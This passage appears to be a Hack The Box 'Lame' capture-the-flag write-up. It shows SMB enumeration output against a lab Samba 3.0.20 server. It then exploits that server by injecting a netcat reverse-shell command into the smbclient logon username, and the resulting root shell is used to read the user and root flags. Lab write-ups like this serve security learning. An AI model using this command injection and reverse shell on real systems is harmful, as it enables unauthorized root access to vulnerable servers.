	dr--r--r--                0 Mon Aug 16 15:06:31 2021	.ICE-unix
	dw--w--w--                0 Mon Aug 16 15:07:02 2021	vmware-root
	dr--r--r--                0 Mon Aug 16 15:06:57 2021	.X11-unix
	fw--w--w--               11 Mon Aug 16 15:06:57 2021	.X0-lock
	fw--w--w--             1600 Mon Aug 16 15:06:29 2021	vgauthsvclog.txt.0
	.\tmp\.X11-unix\*
	dr--r--r--                0 Mon Aug 16 15:06:57 2021	.
	dr--r--r--                0 Tue Aug 17 07:35:27 2021	..
	fr--r--r--                0 Mon Aug 16 15:06:57 2021	X0
	opt                                               	NO ACCESS	
	IPC$                                              	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$                                            	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
[!] Authentication error on 10.129.187.154

```

`smbmap -H 10.129.187.154 -P 445 -x "ipconfig /all" 2>&1 | tee -a /home/bernhard/htb/lame/scans/tcp_445_smb-smbmap-execute-command.txt; smbmap -u null -p "" -H 10.129.187.154 -P 445 -x "ipconfig /all" 2>&1`

```
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
[\] Working on it...
[|] Working on it...
[/] Working on it...
[-] Working on it...
                                
[!] Authentication error on 10.129.187.154

```


# Exploitation
Start a netcat session on port 4444 on the attacker machine.

```
└──╼ $smbclient //10.129.186.154/tmp --option='client min protocol=NT1'
Enter WORKGROUP\bernhard's password: 
#Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> logon "./=`nohup nc -e /bin/bash 10.10.17.226 4444`"
Password: 
session setup failed: NT_STATUS_IO_TIMEOUT
smb: \> 
```
---

```
└──╼ $nc -lvp 4444
listening on [any] 4444 ...
10.129.186.154: inverse host lookup failed: Unknown host
connect to [10.10.17.226] from (UNKNOWN) [10.129.186.154] 51059
whoami
root
cd /home
ls
ftp
makis
service
user
cd makis
ls
user.txt
cat user.txt
b1e9cb**************************
cd /root
ls
Desktop
reset_logs.sh
root.txt
vnc.log
cat root.txt
7a6cae**************************
```